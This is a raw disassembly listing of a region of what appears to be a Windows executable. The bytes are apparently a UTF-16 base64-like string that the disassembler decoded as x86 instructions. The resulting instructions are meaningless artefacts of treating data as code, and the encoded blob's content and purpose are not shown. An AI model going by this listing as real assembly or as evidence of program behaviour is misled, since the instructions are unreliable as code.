  40a711:	00 76 00             	add    %dh,0x0(%esi)
  40a714:	6c                   	insb   (%dx),%es:(%edi)
  40a715:	00 46 00             	add    %al,0x0(%esi)
  40a718:	6d                   	insl   (%dx),%es:(%edi)
  40a719:	00 58 00             	add    %bl,0x0(%eax)
  40a71c:	4f                   	dec    %edi
  40a71d:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  40a721:	00 4a 00             	add    %cl,0x0(%edx)
  40a724:	50                   	push   %eax
  40a725:	00 7a 00             	add    %bh,0x0(%edx)
  40a728:	59                   	pop    %ecx
  40a729:	00 55 00             	add    %dl,0x0(%ebp)
  40a72c:	55                   	push   %ebp
  40a72d:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40a731:	00 77 00             	add    %dh,0x0(%edi)
  40a734:	6d                   	insl   (%dx),%es:(%edi)
  40a735:	00 43 00             	add    %al,0x0(%ebx)
  40a738:	73 00                	jae    0x40a73a
  40a73a:	4d                   	dec    %ebp
  40a73b:	00 50 00             	add    %dl,0x0(%eax)
  40a73e:	41                   	inc    %ecx
  40a73f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a742:	6d                   	insl   (%dx),%es:(%edi)
  40a743:	00 69 00             	add    %ch,0x0(%ecx)
  40a746:	68 00 31 00 4d       	push   $0x4d003100
  40a74b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a74e:	5a                   	pop    %edx
  40a74f:	00 53 00             	add    %dl,0x0(%ebx)
  40a752:	4c                   	dec    %esp
  40a753:	00 75 00             	add    %dh,0x0(%ebp)
  40a756:	63 00                	arpl   %eax,(%eax)
  40a758:	34 00                	xor    $0x0,%al
  40a75a:	77 00                	ja     0x40a75c
  40a75c:	54                   	push   %esp
  40a75d:	00 66 00             	add    %ah,0x0(%esi)
  40a760:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40a764:	4c                   	dec    %esp
  40a765:	00 2b                	add    %ch,(%ebx)
  40a767:	00 69 00             	add    %ch,0x0(%ecx)
  40a76a:	38 00                	cmp    %al,(%eax)
  40a76c:	5a                   	pop    %edx
  40a76d:	00 46 00             	add    %al,0x0(%esi)
  40a770:	49                   	dec    %ecx
  40a771:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  40a775:	00 65 00             	add    %ah,0x0(%ebp)
  40a778:	6f                   	outsl  %ds:(%esi),(%dx)
  40a779:	00 58 00             	add    %bl,0x0(%eax)
  40a77c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a77d:	00 55 00             	add    %dl,0x0(%ebp)
  40a780:	46                   	inc    %esi
  40a781:	00 77 00             	add    %dh,0x0(%edi)
  40a784:	5a                   	pop    %edx
  40a785:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40a789:	00 59 00             	add    %bl,0x0(%ecx)
  40a78c:	56                   	push   %esi
  40a78d:	00 68 00             	add    %ch,0x0(%eax)
  40a790:	32 00                	xor    (%eax),%al
  40a792:	54                   	push   %esp
  40a793:	00 33                	add    %dh,(%ebx)
  40a795:	00 6d 00             	add    %ch,0x0(%ebp)
  40a798:	65 00 36             	add    %dh,%gs:(%esi)
  40a79b:	00 49 00             	add    %cl,0x0(%ecx)
  40a79e:	38 00                	cmp    %al,(%eax)
  40a7a0:	55                   	push   %ebp
  40a7a1:	00 59 00             	add    %bl,0x0(%ecx)
  40a7a4:	62 00                	bound  %eax,(%eax)
  40a7a6:	4c                   	dec    %esp
  40a7a7:	00 75 00             	add    %dh,0x0(%ebp)
  40a7aa:	49                   	dec    %ecx
  40a7ab:	00 61 00             	add    %ah,0x0(%ecx)
  40a7ae:	69 00 67 00 49 00    	imul   $0x490067,(%eax),%eax
  40a7b4:	79 00                	jns    0x40a7b6
  40a7b6:	65 00 54 00 67       	add    %dl,%gs:0x67(%eax,%eax,1)
  40a7bb:	00 65 00             	add    %ah,0x0(%ebp)
  40a7be:	75 00                	jne    0x40a7c0
  40a7c0:	70 00                	jo     0x40a7c2
  40a7c2:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40a7c6:	75 00                	jne    0x40a7c8
  40a7c8:	49                   	dec    %ecx
  40a7c9:	00 4a 00             	add    %cl,0x0(%edx)
  40a7cc:	73 00                	jae    0x40a7ce
  40a7ce:	53                   	push   %ebx
  40a7cf:	00 7a 00             	add    %bh,0x0(%edx)
  40a7d2:	4b                   	dec    %ebx
  40a7d3:	00 72 00             	add    %dh,0x0(%edx)
  40a7d6:	46                   	inc    %esi
  40a7d7:	00 73 00             	add    %dh,0x0(%ebx)
  40a7da:	64 00 31             	add    %dh,%fs:(%ecx)
  40a7dd:	00 50 00             	add    %dl,0x0(%eax)
  40a7e0:	70 00                	jo     0x40a7e2
  40a7e2:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40a7e6:	38 00                	cmp    %al,(%eax)
  40a7e8:	70 00                	jo     0x40a7ea
  40a7ea:	45                   	inc    %ebp
  40a7eb:	00 68 00             	add    %ch,0x0(%eax)
  40a7ee:	7a 00                	jp     0x40a7f0
  40a7f0:	2f                   	das
  40a7f1:	00 33                	add    %dh,(%ebx)
  40a7f3:	00 52 00             	add    %dl,0x0(%edx)
  40a7f6:	37                   	aaa
  40a7f7:	00 35 00 71 00 78    	add    %dh,0x78007100
  40a7fd:	00 32                	add    %dh,(%edx)
  40a7ff:	00 73 00             	add    %dh,0x0(%ebx)
  40a802:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40a806:	49                   	dec    %ecx
  40a807:	00 65 00             	add    %ah,0x0(%ebp)
  40a80a:	33 00                	xor    (%eax),%eax
  40a80c:	77 00                	ja     0x40a80e
  40a80e:	6c                   	insb   (%dx),%es:(%edi)
  40a80f:	00 65 00             	add    %ah,0x0(%ebp)
  40a812:	46                   	inc    %esi
  40a813:	00 7a 00             	add    %bh,0x0(%edx)
  40a816:	4c                   	dec    %esp
  40a817:	00 4f 00             	add    %cl,0x0(%edi)
  40a81a:	47                   	inc    %edi
  40a81b:	00 57 00             	add    %dl,0x0(%edi)
  40a81e:	6c                   	insb   (%dx),%es:(%edi)
  40a81f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a822:	4f                   	dec    %edi
  40a823:	00 76 00             	add    %dh,0x0(%esi)
  40a826:	49                   	dec    %ecx
  40a827:	00 32                	add    %dh,(%edx)
  40a829:	00 49 00             	add    %cl,0x0(%ecx)
  40a82c:	79 00                	jns    0x40a82e
  40a82e:	4b                   	dec    %ebx
  40a82f:	00 48 00             	add    %cl,0x0(%eax)
  40a832:	33 00                	xor    (%eax),%eax
  40a834:	7a 00                	jp     0x40a836
  40a836:	70 00                	jo     0x40a838
  40a838:	50                   	push   %eax
  40a839:	00 66 00             	add    %ah,0x0(%esi)
  40a83c:	78 00                	js     0x40a83e
  40a83e:	50                   	push   %eax
  40a83f:	00 4e 00             	add    %cl,0x0(%esi)
  40a842:	78 00                	js     0x40a844
  40a844:	48                   	dec    %eax
  40a845:	00 39                	add    %bh,(%ecx)
  40a847:	00 39                	add    %bh,(%ecx)
  40a849:	00 2b                	add    %ch,(%ebx)
  40a84b:	00 42 00             	add    %al,0x0(%edx)
  40a84e:	69 00 73 00 4a 00    	imul   $0x4a0073,(%eax),%eax
  40a854:	31 00                	xor    %eax,(%eax)
  40a856:	39 00                	cmp    %eax,(%eax)
  40a858:	59                   	pop    %ecx
  40a859:	00 2f                	add    %ch,(%edi)
  40a85b:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  40a85f:	00 42 00             	add    %al,0x0(%edx)
  40a862:	68 00 78 00 46       	push   $0x46007800
  40a867:	00 6d 00             	add    %ch,0x0(%ebp)
  40a86a:	41                   	inc    %ecx
  40a86b:	00 58 00             	add    %bl,0x0(%eax)
  40a86e:	30 00                	xor    %al,(%eax)
  40a870:	6e                   	outsb  %ds:(%esi),(%dx)
  40a871:	00 5a 00             	add    %bl,0x0(%edx)
  40a874:	54                   	push   %esp
  40a875:	00 37                	add    %dh,(%edi)
  40a877:	00 62 00             	add    %ah,0x0(%edx)
  40a87a:	49                   	dec    %ecx
  40a87b:	00 7a 00             	add    %bh,0x0(%edx)
  40a87e:	72 00                	jb     0x40a880
  40a880:	50                   	push   %eax
  40a881:	00 77 00             	add    %dh,0x0(%edi)
  40a884:	79 00                	jns    0x40a886
  40a886:	4c                   	dec    %esp
  40a887:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  40a88b:	00 49 00             	add    %cl,0x0(%ecx)
  40a88e:	46                   	inc    %esi
  40a88f:	00 33                	add    %dh,(%ebx)
  40a891:	00 6d 00             	add    %ch,0x0(%ebp)
  40a894:	53                   	push   %ebx
  40a895:	00 6a 00             	add    %ch,0x0(%edx)
  40a898:	6b 00 39             	imul   $0x39,(%eax),%eax
  40a89b:	00 2b                	add    %ch,(%ebx)
  40a89d:	00 52 00             	add    %dl,0x0(%edx)
  40a8a0:	50                   	push   %eax
  40a8a1:	00 58 00             	add    %bl,0x0(%eax)
  40a8a4:	4f                   	dec    %edi
  40a8a5:	00 35 00 62 00 42    	add    %dh,0x42006200
  40a8ab:	00 47 00             	add    %al,0x0(%edi)
  40a8ae:	43                   	inc    %ebx
  40a8af:	00 41 00             	add    %al,0x0(%ecx)
  40a8b2:	42                   	inc    %edx
  40a8b3:	00 49 00             	add    %cl,0x0(%ecx)
  40a8b6:	2f                   	das
  40a8b7:	00 2f                	add    %ch,(%edi)
  40a8b9:	00 59 00             	add    %bl,0x0(%ecx)
  40a8bc:	78 00                	js     0x40a8be
  40a8be:	2f                   	das
  40a8bf:	00 65 00             	add    %ah,0x0(%ebp)
  40a8c2:	38 00                	cmp    %al,(%eax)
  40a8c4:	33 00                	xor    (%eax),%eax
  40a8c6:	48                   	dec    %eax
  40a8c7:	00 56 00             	add    %dl,0x0(%esi)
  40a8ca:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40a8ce:	78 00                	js     0x40a8d0
  40a8d0:	33 00                	xor    (%eax),%eax
  40a8d2:	56                   	push   %esi
  40a8d3:	00 55 00             	add    %dl,0x0(%ebp)
  40a8d6:	41                   	inc    %ecx
  40a8d7:	00 57 00             	add    %dl,0x0(%edi)
  40a8da:	59                   	pop    %ecx
  40a8db:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40a8df:	00 45 00             	add    %al,0x0(%ebp)
  40a8e2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8e3:	00 33                	add    %dh,(%ebx)
  40a8e5:	00 53 00             	add    %dl,0x0(%ebx)
  40a8e8:	49                   	dec    %ecx
  40a8e9:	00 75 00             	add    %dh,0x0(%ebp)
  40a8ec:	63 00                	arpl   %eax,(%eax)
  40a8ee:	70 00                	jo     0x40a8f0
  40a8f0:	64 00 33             	add    %dh,%fs:(%ebx)
  40a8f3:	00 51 00             	add    %dl,0x0(%ecx)
  40a8f6:	62 00                	bound  %eax,(%eax)
  40a8f8:	42                   	inc    %edx
  40a8f9:	00 32                	add    %dh,(%edx)
  40a8fb:	00 66 00             	add    %ah,0x0(%esi)
  40a8fe:	36 00 37             	add    %dh,%ss:(%edi)
  40a901:	00 31                	add    %dh,(%ecx)
  40a903:	00 6b 00             	add    %ch,0x0(%ebx)
  40a906:	2b 00                	sub    (%eax),%eax
  40a908:	49                   	dec    %ecx
  40a909:	00 72 00             	add    %dh,0x0(%edx)
  40a90c:	62 00                	bound  %eax,(%eax)
  40a90e:	48                   	dec    %eax
  40a90f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a912:	39 00                	cmp    %eax,(%eax)
  40a914:	79 00                	jns    0x40a916
  40a916:	35 00 6e 00 72       	xor    $0x72006e00,%eax
  40a91b:	00 79 00             	add    %bh,0x0(%ecx)
  40a91e:	48                   	dec    %eax
  40a91f:	00 4a 00             	add    %cl,0x0(%edx)
  40a922:	33 00                	xor    (%eax),%eax
  40a924:	4e                   	dec    %esi
  40a925:	00 56 00             	add    %dl,0x0(%esi)
  40a928:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40a92c:	63 00                	arpl   %eax,(%eax)
  40a92e:	46                   	inc    %esi
  40a92f:	00 44 00 39          	add    %al,0x39(%eax,%eax,1)
  40a933:	00 65 00             	add    %ah,0x0(%ebp)
  40a936:	35 00 71 00 49       	xor    $0x49007100,%eax
  40a93b:	00 56 00             	add    %dl,0x0(%esi)
  40a93e:	2b 00                	sub    (%eax),%eax
  40a940:	45                   	inc    %ebp
  40a941:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40a945:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40a949:	00 32                	add    %dh,(%edx)
  40a94b:	00 38                	add    %bh,(%eax)
  40a94d:	00 4a 00             	add    %cl,0x0(%edx)
  40a950:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40a954:	63 00                	arpl   %eax,(%eax)
  40a956:	71 00                	jno    0x40a958
  40a958:	6d                   	insl   (%dx),%es:(%edi)
  40a959:	00 48 00             	add    %cl,0x0(%eax)
  40a95c:	50                   	push   %eax
  40a95d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a960:	5a                   	pop    %edx
  40a961:	00 57 00             	add    %dl,0x0(%edi)
  40a964:	31 00                	xor    %eax,(%eax)
  40a966:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40a969:	00 76 00             	add    %dh,0x0(%esi)
  40a96c:	41                   	inc    %ecx
  40a96d:	00 47 00             	add    %al,0x0(%edi)
  40a970:	30 00                	xor    %al,(%eax)
  40a972:	32 00                	xor    (%eax),%al
  40a974:	45                   	inc    %ebp
  40a975:	00 6e 00             	add    %ch,0x0(%esi)
  40a978:	76 00                	jbe    0x40a97a
  40a97a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a97b:	00 72 00             	add    %dh,0x0(%edx)
  40a97e:	70 00                	jo     0x40a980
  40a980:	46                   	inc    %esi
  40a981:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40a985:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40a989:	00 72 00             	add    %dh,0x0(%edx)
  40a98c:	6d                   	insl   (%dx),%es:(%edi)
  40a98d:	00 6a 00             	add    %ch,0x0(%edx)
  40a990:	78 00                	js     0x40a992
  40a992:	45                   	inc    %ebp
  40a993:	00 35 00 4a 00 53    	add    %dh,0x53004a00
  40a999:	00 59 00             	add    %bl,0x0(%ecx)
  40a99c:	79 00                	jns    0x40a99e
  40a99e:	52                   	push   %edx
  40a99f:	00 31                	add    %dh,(%ecx)
  40a9a1:	00 65 00             	add    %ah,0x0(%ebp)
  40a9a4:	2f                   	das
  40a9a5:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40a9a9:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9ac:	47                   	inc    %edi
  40a9ad:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40a9b1:	00 52 00             	add    %dl,0x0(%edx)
  40a9b4:	5a                   	pop    %edx
  40a9b5:	00 42 00             	add    %al,0x0(%edx)
  40a9b8:	38 00                	cmp    %al,(%eax)
  40a9ba:	59                   	pop    %ecx
  40a9bb:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40a9bf:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  40a9c3:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9c6:	7a 00                	jp     0x40a9c8
  40a9c8:	38 00                	cmp    %al,(%eax)
  40a9ca:	53                   	push   %ebx
  40a9cb:	00 53 00             	add    %dl,0x0(%ebx)
  40a9ce:	32 00                	xor    (%eax),%al
  40a9d0:	76 00                	jbe    0x40a9d2
  40a9d2:	59                   	pop    %ecx
  40a9d3:	00 36                	add    %dh,(%esi)
  40a9d5:	00 6e 00             	add    %ch,0x0(%esi)
  40a9d8:	31 00                	xor    %eax,(%eax)
  40a9da:	4f                   	dec    %edi
  40a9db:	00 4f 00             	add    %cl,0x0(%edi)
  40a9de:	48                   	dec    %eax
  40a9df:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9e2:	48                   	dec    %eax
  40a9e3:	00 77 00             	add    %dh,0x0(%edi)
  40a9e6:	38 00                	cmp    %al,(%eax)
  40a9e8:	6d                   	insl   (%dx),%es:(%edi)
  40a9e9:	00 45 00             	add    %al,0x0(%ebp)
  40a9ec:	55                   	push   %ebp
  40a9ed:	00 76 00             	add    %dh,0x0(%esi)
  40a9f0:	63 00                	arpl   %eax,(%eax)
  40a9f2:	57                   	push   %edi
  40a9f3:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9f6:	44                   	inc    %esp
  40a9f7:	00 55 00             	add    %dl,0x0(%ebp)
  40a9fa:	6a 00                	push   $0x0
  40a9fc:	6b 00 44             	imul   $0x44,(%eax),%eax
  40a9ff:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa02:	31 00                	xor    %eax,(%eax)
  40aa04:	4a                   	dec    %edx
  40aa05:	00 69 00             	add    %ch,0x0(%ecx)
  40aa08:	46                   	inc    %esi
  40aa09:	00 33                	add    %dh,(%ebx)
  40aa0b:	00 66 00             	add    %ah,0x0(%esi)
  40aa0e:	5a                   	pop    %edx
  40aa0f:	00 30                	add    %dh,(%eax)
  40aa11:	00 5a 00             	add    %bl,0x0(%edx)
  40aa14:	43                   	inc    %ebx
  40aa15:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa18:	32 00                	xor    (%eax),%al
  40aa1a:	4f                   	dec    %edi
  40aa1b:	00 72 00             	add    %dh,0x0(%edx)
  40aa1e:	4a                   	dec    %edx
  40aa1f:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa22:	73 00                	jae    0x40aa24
  40aa24:	32 00                	xor    (%eax),%al
  40aa26:	4b                   	dec    %ebx
  40aa27:	00 76 00             	add    %dh,0x0(%esi)
  40aa2a:	50                   	push   %eax
  40aa2b:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  40aa2f:	00 38                	add    %bh,(%eax)
  40aa31:	00 62 00             	add    %ah,0x0(%edx)
  40aa34:	4b                   	dec    %ebx
  40aa35:	00 33                	add    %dh,(%ebx)
  40aa37:	00 32                	add    %dh,(%edx)
  40aa39:	00 39                	add    %bh,(%ecx)
  40aa3b:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40aa3f:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa42:	68 00 50 00 31       	push   $0x31005000
  40aa47:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa4a:	36 00 35 00 31 00 63 	add    %dh,%ss:0x63003100
  40aa51:	00 35 00 37 00 31    	add    %dh,0x31003700
  40aa57:	00 42 00             	add    %al,0x0(%edx)
  40aa5a:	73 00                	jae    0x40aa5c
  40aa5c:	72 00                	jb     0x40aa5e
  40aa5e:	37                   	aaa
  40aa5f:	00 6e 00             	add    %ch,0x0(%esi)
  40aa62:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40aa66:	32 00                	xor    (%eax),%al
  40aa68:	46                   	inc    %esi
  40aa69:	00 59 00             	add    %bl,0x0(%ecx)
  40aa6c:	63 00                	arpl   %eax,(%eax)
  40aa6e:	4c                   	dec    %esp
  40aa6f:	00 38                	add    %bh,(%eax)
  40aa71:	00 45 00             	add    %al,0x0(%ebp)
  40aa74:	39 00                	cmp    %eax,(%eax)
  40aa76:	4a                   	dec    %edx
  40aa77:	00 6f 00             	add    %ch,0x0(%edi)
  40aa7a:	6a 00                	push   $0x0
  40aa7c:	47                   	inc    %edi
  40aa7d:	00 4e 00             	add    %cl,0x0(%esi)
  40aa80:	5a                   	pop    %edx
  40aa81:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40aa85:	00 6a 00             	add    %ch,0x0(%edx)
  40aa88:	2f                   	das
  40aa89:	00 30                	add    %dh,(%eax)
  40aa8b:	00 6e 00             	add    %ch,0x0(%esi)
  40aa8e:	54                   	push   %esp
  40aa8f:	00 49 00             	add    %cl,0x0(%ecx)
  40aa92:	58                   	pop    %eax
  40aa93:	00 63 00             	add    %ah,0x0(%ebx)
  40aa96:	34 00                	xor    $0x0,%al
  40aa98:	68 00 46 00 69       	push   $0x69004600
  40aa9d:	00 4a 00             	add    %cl,0x0(%edx)
  40aaa0:	33 00                	xor    (%eax),%eax
  40aaa2:	6d                   	insl   (%dx),%es:(%edi)
  40aaa3:	00 49 00             	add    %cl,0x0(%ecx)
  40aaa6:	39 00                	cmp    %eax,(%eax)
  40aaa8:	52                   	push   %edx
  40aaa9:	00 31                	add    %dh,(%ecx)
  40aaab:	00 45 00             	add    %al,0x0(%ebp)
  40aaae:	5a                   	pop    %edx
  40aaaf:	00 7a 00             	add    %bh,0x0(%edx)
  40aab2:	4f                   	dec    %edi
  40aab3:	00 52 00             	add    %dl,0x0(%edx)
  40aab6:	4c                   	dec    %esp
  40aab7:	00 39                	add    %bh,(%ecx)
  40aab9:	00 6d 00             	add    %ch,0x0(%ebp)
  40aabc:	6e                   	outsb  %ds:(%esi),(%dx)
  40aabd:	00 69 00             	add    %ch,0x0(%ecx)
  40aac0:	66 00 64 00 52       	data16 add %ah,0x52(%eax,%eax,1)
  40aac5:	00 32                	add    %dh,(%edx)
  40aac7:	00 48 00             	add    %cl,0x0(%eax)
  40aaca:	76 00                	jbe    0x40aacc
  40aacc:	41                   	inc    %ecx
  40aacd:	00 49 00             	add    %cl,0x0(%ecx)
  40aad0:	39 00                	cmp    %eax,(%eax)
  40aad2:	4b                   	dec    %ebx
  40aad3:	00 79 00             	add    %bh,0x0(%ecx)
  40aad6:	4c                   	dec    %esp
  40aad7:	00 69 00             	add    %ch,0x0(%ecx)
  40aada:	6d                   	insl   (%dx),%es:(%edi)
  40aadb:	00 45 00             	add    %al,0x0(%ebp)
  40aade:	73 00                	jae    0x40aae0
  40aae0:	78 00                	js     0x40aae2
  40aae2:	35 00 47 00 56       	xor    $0x56004700,%eax
  40aae7:	00 59 00             	add    %bl,0x0(%ecx)
  40aaea:	53                   	push   %ebx
  40aaeb:	00 5a 00             	add    %bl,0x0(%edx)
  40aaee:	2f                   	das
  40aaef:	00 2f                	add    %ch,(%edi)
  40aaf1:	00 75 00             	add    %dh,0x0(%ebp)
  40aaf4:	6f                   	outsl  %ds:(%esi),(%dx)
  40aaf5:	00 49 00             	add    %cl,0x0(%ecx)
  40aaf8:	4e                   	dec    %esi
  40aaf9:	00 50 00             	add    %dl,0x0(%eax)
  40aafc:	52                   	push   %edx
  40aafd:	00 4f 00             	add    %cl,0x0(%edi)
  40ab00:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab01:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab04:	72 00                	jb     0x40ab06
  40ab06:	6c                   	insb   (%dx),%es:(%edi)
  40ab07:	00 63 00             	add    %ah,0x0(%ebx)
  40ab0a:	2f                   	das
  40ab0b:	00 45 00             	add    %al,0x0(%ebp)
  40ab0e:	74 00                	je     0x40ab10
  40ab10:	4e                   	dec    %esi
  40ab11:	00 59 00             	add    %bl,0x0(%ecx)
  40ab14:	43                   	inc    %ebx
  40ab15:	00 78 00             	add    %bh,0x0(%eax)
  40ab18:	56                   	push   %esi
  40ab19:	00 6e 00             	add    %ch,0x0(%esi)
  40ab1c:	33 00                	xor    (%eax),%eax
  40ab1e:	56                   	push   %esi
  40ab1f:	00 55 00             	add    %dl,0x0(%ebp)
  40ab22:	46                   	inc    %esi
  40ab23:	00 39                	add    %bh,(%ecx)
  40ab25:	00 49 00             	add    %cl,0x0(%ecx)
  40ab28:	76 00                	jbe    0x40ab2a
  40ab2a:	32 00                	xor    (%eax),%al
  40ab2c:	68 00 31 00 37       	push   $0x37003100
  40ab31:	00 37                	add    %dh,(%edi)
  40ab33:	00 52 00             	add    %dl,0x0(%edx)
  40ab36:	49                   	dec    %ecx
  40ab37:	00 42 00             	add    %al,0x0(%edx)
  40ab3a:	77 00                	ja     0x40ab3c
  40ab3c:	77 00                	ja     0x40ab3e
  40ab3e:	55                   	push   %ebp
  40ab3f:	00 6e 00             	add    %ch,0x0(%esi)
  40ab42:	42                   	inc    %edx
  40ab43:	00 67 00             	add    %ah,0x0(%edi)
  40ab46:	4c                   	dec    %esp
  40ab47:	00 66 00             	add    %ah,0x0(%esi)
  40ab4a:	61                   	popa
  40ab4b:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40ab4f:	00 6e 00             	add    %ch,0x0(%esi)
  40ab52:	67 00 66 00          	add    %ah,0x0(%bp)
  40ab56:	51                   	push   %ecx
  40ab57:	00 6f 00             	add    %ch,0x0(%edi)
  40ab5a:	79 00                	jns    0x40ab5c
  40ab5c:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40ab60:	62 00                	bound  %eax,(%eax)
  40ab62:	6b 00 45             	imul   $0x45,(%eax),%eax
  40ab65:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab68:	2f                   	das
  40ab69:	00 49 00             	add    %cl,0x0(%ecx)
  40ab6c:	2f                   	das
  40ab6d:	00 46 00             	add    %al,0x0(%esi)
  40ab70:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab71:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab74:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab75:	00 59 00             	add    %bl,0x0(%ecx)
  40ab78:	54                   	push   %esp
  40ab79:	00 45 00             	add    %al,0x0(%ebp)
  40ab7c:	37                   	aaa
  40ab7d:	00 2f                	add    %ch,(%edi)
  40ab7f:	00 5a 00             	add    %bl,0x0(%edx)
  40ab82:	46                   	inc    %esi
  40ab83:	00 61 00             	add    %ah,0x0(%ecx)
  40ab86:	37                   	aaa
  40ab87:	00 57 00             	add    %dl,0x0(%edi)
  40ab8a:	46                   	inc    %esi
  40ab8b:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
  40ab8f:	00 68 00             	add    %ch,0x0(%eax)
  40ab92:	46                   	inc    %esi
  40ab93:	00 45 00             	add    %al,0x0(%ebp)
  40ab96:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40ab9a:	5a                   	pop    %edx
  40ab9b:	00 57 00             	add    %dl,0x0(%edi)
  40ab9e:	61                   	popa
  40ab9f:	00 62 00             	add    %ah,0x0(%edx)
  40aba2:	45                   	inc    %ebp
  40aba3:	00 4f 00             	add    %cl,0x0(%edi)
  40aba6:	52                   	push   %edx
  40aba7:	00 45 00             	add    %al,0x0(%ebp)
  40abaa:	39 00                	cmp    %eax,(%eax)
  40abac:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40abb0:	4c                   	dec    %esp
  40abb1:	00 73 00             	add    %dh,0x0(%ebx)
  40abb4:	55                   	push   %ebp
  40abb5:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40abb9:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40abbd:	00 35 00 6b 00 54    	add    %dh,0x54006b00
  40abc3:	00 68 00             	add    %ch,0x0(%eax)
  40abc6:	69 00 4e 00 6e 00    	imul   $0x6e004e,(%eax),%eax
  40abcc:	68 00 68 00 67       	push   $0x67006800
  40abd1:	00 52 00             	add    %dl,0x0(%edx)
  40abd4:	38 00                	cmp    %al,(%eax)
  40abd6:	41                   	inc    %ecx
  40abd7:	00 47 00             	add    %al,0x0(%edi)
  40abda:	69 00 74 00 42 00    	imul   $0x420074,(%eax),%eax
  40abe0:	34 00                	xor    $0x0,%al
  40abe2:	56                   	push   %esi
  40abe3:	00 51 00             	add    %dl,0x0(%ecx)
  40abe6:	52                   	push   %edx
  40abe7:	00 42 00             	add    %al,0x0(%edx)
  40abea:	59                   	pop    %ecx
  40abeb:	00 42 00             	add    %al,0x0(%edx)
  40abee:	44                   	inc    %esp
  40abef:	00 72 00             	add    %dh,0x0(%edx)
  40abf2:	62 00                	bound  %eax,(%eax)
  40abf4:	57                   	push   %edi
  40abf5:	00 4f 00             	add    %cl,0x0(%edi)
  40abf8:	5a                   	pop    %edx
  40abf9:	00 77 00             	add    %dh,0x0(%edi)
  40abfc:	76 00                	jbe    0x40abfe
  40abfe:	33 00                	xor    (%eax),%eax
  40ac00:	53                   	push   %ebx
  40ac01:	00 48 00             	add    %cl,0x0(%eax)
  40ac04:	51                   	push   %ecx
  40ac05:	00 77 00             	add    %dh,0x0(%edi)
  40ac08:	66 00 42 00          	data16 add %al,0x0(%edx)
  40ac0c:	53                   	push   %ebx
  40ac0d:	00 6e 00             	add    %ch,0x0(%esi)
  40ac10:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40ac14:	68 00 76 00 65       	push   $0x65007600
  40ac19:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac1c:	37                   	aaa
  40ac1d:	00 63 00             	add    %ah,0x0(%ebx)
  40ac20:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac21:	00 2b                	add    %ch,(%ebx)
  40ac23:	00 36                	add    %dh,(%esi)
  40ac25:	00 6f 00             	add    %ch,0x0(%edi)
  40ac28:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac29:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40ac2d:	00 66 00             	add    %ah,0x0(%esi)
  40ac30:	2f                   	das
  40ac31:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac34:	77 00                	ja     0x40ac36
  40ac36:	31 00                	xor    %eax,(%eax)
  40ac38:	41                   	inc    %ecx
  40ac39:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40ac3d:	00 58 00             	add    %bl,0x0(%eax)
  40ac40:	48                   	dec    %eax
  40ac41:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40ac45:	00 5a 00             	add    %bl,0x0(%edx)
  40ac48:	2b 00                	sub    (%eax),%eax
  40ac4a:	31 00                	xor    %eax,(%eax)
  40ac4c:	74 00                	je     0x40ac4e
